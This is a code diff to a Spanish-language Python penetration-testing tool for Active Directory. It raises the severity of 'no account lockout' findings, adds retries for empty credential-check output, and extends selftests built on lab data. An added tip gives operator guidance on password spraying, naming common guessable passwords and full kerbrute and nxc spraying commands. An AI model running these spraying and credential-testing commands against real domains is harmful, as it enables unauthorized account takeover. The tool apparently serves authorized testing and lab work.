@@ -2266,7 +2266,7 @@ def _smb_ad_enum(res, nxc, ip, auth_user=None, anon_readable=False):
                 if pp:
                     res["findings"].append(("info", pp))
                 if pol.get("lockout_threshold") in ("None", "0"):
-                    res["findings"].append(("media", "AD: sin bloqueo de cuentas (lockout = None/0) — no bloquea al validar credenciales"))
+                    res["findings"].append(("alta", "AD: sin bloqueo de cuentas (lockout = None/0) — password spraying sin riesgo de bloquear a nadie contra la lista de usuarios ya enumerada"))
     else:
         res["findings"].append(("info",
             f"SMB: {ident} aceptada pero sin lectura anónima (RID cycling y shares denegados) → "
@@ -3184,7 +3184,7 @@ def fp_ldap(ip, ports, services, host, deep):
                         if pp:
                             res["findings"].append(("info", pp))
                         if pol.get("lockout_threshold") in ("None", "0"):
-                            res["findings"].append(("media", "AD: sin bloqueo de cuentas (lockout = None/0) — no bloquea al validar credenciales"))
+                            res["findings"].append(("alta", "AD: sin bloqueo de cuentas (lockout = None/0) — password spraying sin riesgo de bloquear a nadie contra la lista de usuarios ya enumerada"))
                 # get-desc-users: módulo nxc dedicado a buscar contraseñas en el campo
                 # "description" de las cuentas (fallo de higiene clásico en AD: alguien
                 # apunta ahí la contraseña inicial/temporal). Antes solo quedaba como
@@ -4989,7 +4989,11 @@ def _cc_nxc(res, nxc, nxc_proto, ip, creds, port=None):
         dp = _NXC_DEFAULT_PORT.get(nxc_proto)
         if port and dp and port != dp:
             cmd += ["--port", str(port)]
-        rc, out = run_capture(cmd, timeout=40)
+        # _run_capture_retry: una salida vacía transitoria (frecuente por SMB tras varias llamadas
+        # seguidas) marcaba la credencial por defecto como "probada, no vale" cuando en realidad
+        # nxc no llegó a responder — mismo falso negativo silencioso confirmado en vivo con las
+        # credenciales por defecto SMB (4/4 vacías en un host, 3/4 en otro del mismo run).
+        rc, out = _run_capture_retry(cmd, timeout=40)
         ok = _nxc_ok(out)
         _step(res, shlex.join(cmd), ok, out,
               note=f"probar credencial por defecto «{lbl}» por {nxc_proto.upper()} (1 intento, no es fuerza bruta)")
@@ -6218,7 +6222,7 @@ def _surface_ad_enum(res, u, mod, out, base=None, seen=None):
         if pp:
             _add_once(res, "info", pp, "política de contraseñas", seen)
         if pol.get("lockout_threshold") in ("None", "0"):
-            _add_once(res, "media",
+            _add_once(res, "alta",
                       f"AD (cred {u}): sin bloqueo de cuentas (lockout None/0) → el password spraying no bloquea cuentas",
                       "sin bloqueo de cuentas", seen)
 
@@ -7340,7 +7344,13 @@ def _nxc_try_cred(nxc, np, ip, user, secret, is_hash, local_auth, port, dp):
             cmd.append("--local-auth")
         if port and dp and port != dp:
             cmd += ["--port", str(port)]
-        rc, out = run_capture(cmd, timeout=40, quiet=True)
+        # _run_capture_retry (no run_capture a secas): nxc por SMB/LDAP puede devolver salida
+        # COMPLETAMENTE vacía de forma transitoria (timing de la conexión, sobre todo tras varias
+        # llamadas seguidas al mismo host) aunque la credencial SÍ valga — confirmado en vivo:
+        # 'nxc smb IP -u AB920 -p weasal' salió vacío en la reutilización y se marcó como fallo,
+        # pero el MISMO comando a mano segundos después autenticó (Pwn3d!). Sin el reintento,
+        # _nxc_ok("")=False da un falso negativo silencioso y NO se enumera con esa credencial.
+        rc, out = _run_capture_retry(cmd, timeout=40, quiet=True)
     finally:
         if sec_file:
             try:
@@ -7606,6 +7616,17 @@ def provided_creds_check(ip, services, creds, bulk=None, local_auth=False, is_ha
                          "(120s) antes de darla por no válida.")
                     rc2, out2 = run_capture(cmd, timeout=120, quiet=True)
                     if rc2 is not None or out2:
+                        rc, out = rc2, out2
+                # Otro fallo transitorio distinto del timeout: salida COMPLETAMENTE vacía (ni éxito
+                # ni STATUS_LOGON_FAILURE — un fallo de auth real SÍ trae texto). Confirmado en vivo:
+                # 'nxc smb IP -u AB920 -p weasal' salió vacío aquí y se marcó como no válida, pero
+                # a mano segundos después autenticó (Pwn3d!). Sin reintento, _nxc_ok("")=False da un
+                # falso negativo silencioso y _creds_enum (--users/--shares/roasting…) se salta ENTERA.
+                elif not (out or "").strip():
+                    warn(f"{np.upper()}: la credencial aportada «{u}» salió sin NINGUNA respuesta — reintento "
+                         "(posible fallo transitorio de la conexión, no necesariamente credencial inválida).")
+                    rc2, out2 = run_capture(cmd, timeout=40, quiet=True)
+                    if (out2 or "").strip():
                         rc, out = rc2, out2
             finally:
                 if sec_file:
@@ -8072,6 +8093,14 @@ _TIPS = (
      "Igual que el AS-REP, el crackeo (hashcat -m 13100) es offline — pero aquí la contraseña "
      "de la cuenta de servicio sí importa: nadie las rota a mano tan a menudo como las de "
      "usuario. Prioriza las que suenen a privilegiadas (svc_/sql/backup/admin)."),
+    (re.compile(r"sin bloqueo de cuentas", re.I),
+     "Sin bloqueo de cuentas + la lista de usuarios que palantir ya enumeró = password spraying "
+     "de los más rentables en un DC: prueba UNA contraseña probable contra TODOS los usuarios a la "
+     "vez (no muchas contra uno). Clásicas que pegan en labs: 'Welcome1', 'Password123', el nombre "
+     "de la empresa + año, o Estación/Mes+año. 'kerbrute passwordspray -d DOMINIO --dc IP "
+     "ad_users.txt <pass>' (no toca badPwdCount vía Kerberos pre-auth) o 'nxc smb IP -u ad_users.txt "
+     "-p <pass> --continue-on-success'. OJO: 'sin bloqueo' no es 'sin registro' — cada fallo SÍ "
+     "incrementa badPwdCount y queda en los logs del DC; no dispares miles de intentos por ruido."),
     (re.compile(r"plantilla\(s\) vulnerable", re.I),
      "ESC1/ESC2/ESC3 suelen ser los más directos (pedir un cert como Administrator); ESC8 "
      "necesita relay NTLM contra el propio servicio de inscripción web, un paso más. Antes de "
@@ -9716,7 +9745,10 @@ def selftest():
                      "SMB x 445 DC  500: DOM\\Administrator (SidTypeUser)\nSMB x 445 DC  1106: DOM\\jpinkman (SidTypeUser)\nSMB x 445 DC  1002: DOM\\DC01$ (SidTypeUser)")
     assert sum("usuarios del dominio" in t for _, t in _ad["findings"]) == 1   # 1 sola vez pese a users + rid-brute
     _surface_ad_enum(_ad, "wwhite", "--pass-pol", "SMB x 445 DC  Account Lockout Threshold: None")
-    assert any("sin bloqueo de cuentas" in t for _, t in _ad["findings"])
+    # 'sin bloqueo' ahora es 'alta' (no 'media'): sube a Quick Wins — con la lista de usuarios ya
+    # enumerada es password spraying directo, el operador pidió que fuera más visible. Y lleva tip.
+    assert any(s == "alta" and "sin bloqueo de cuentas" in t for s, t in _ad["findings"])
+    assert _tip_for("AD (cred x): sin bloqueo de cuentas (lockout None/0) → el password spraying no bloquea cuentas") is not None
 
     # _parse_pass_pol / _format_pass_pol_finding: salida REAL de `nxc --pass-pol` contra un DC
     # con política NORMAL (lockout=5, no None/0) — pedido explícito: antes esto se leía (quedaba
@@ -10113,7 +10145,7 @@ def selftest():
         globals()["run_capture"] = _real_rc_smbad
     assert any(s == "info" and "política de contraseñas" in t and "longitud mínima 8" in t
                for s, t in _smbad_res["findings"])
-    assert not any(s == "media" and "sin bloqueo" in t for s, t in _smbad_res["findings"])   # lockout=5: no es el caso débil
+    assert not any("sin bloqueo" in t for _, t in _smbad_res["findings"])   # lockout=5: no es el caso débil (ninguna severidad)
 
     # fp_smb SIN nxc/netexec instalado: 'getdompwinfo' (añadido a la cadena de rpcclient) es el
     # único fallback de política de contraseñas por sesión nula — antes, sin nxc, fp_smb no
@@ -11211,6 +11243,21 @@ def selftest():
     finally:
         globals()["run_capture"] = _real_run_capture
     assert len(_retry_calls3) == 1   # con salida real desde el 1er intento, NO reintenta
+
+    # _nxc_try_cred (reuse chain): una credencial VÁLIDA que sale vacía a la primera (fallo
+    # transitorio SMB) NO debe darse por inválida — bug real confirmado en vivo con AB920:weasal,
+    # que salió vacío en la reutilización y luego a mano autenticó (Pwn3d!). Ahora usa
+    # _run_capture_retry: vacío → reintenta → el 2º intento trae el [+]/(Pwn3d!) y ok/pwn=True.
+    _tc_calls = []
+    def _fake_tc_empty_then_pwn(cmd, timeout=None, quiet=False, **kw):
+        _tc_calls.append(cmd)
+        return (0, "SMB 172.16.7.50 445 MS01 [+] INLANEFREIGHT.LOCAL\\AB920:weasal (Pwn3d!)") if len(_tc_calls) > 1 else (1, "")
+    globals()["run_capture"] = _fake_tc_empty_then_pwn
+    try:
+        _tc_ok, _tc_pwn, _tc_safe, _tc_shown = _nxc_try_cred("FAKE_NXC", "smb", "172.16.7.50", "AB920", "weasal", False, False, 445, 445)
+    finally:
+        globals()["run_capture"] = _real_run_capture
+    assert len(_tc_calls) == 2 and _tc_ok and _tc_pwn, (len(_tc_calls), _tc_ok, _tc_pwn)   # vacío→reintento→Pwn3d!
 
     # confirm_creds_spray: combo pequeño (<= umbral) no toca nada; combo grande SIN terminal
     # real tampoco debe bloquear ni mutar (ni llamar a input() — isatty forzado a False a
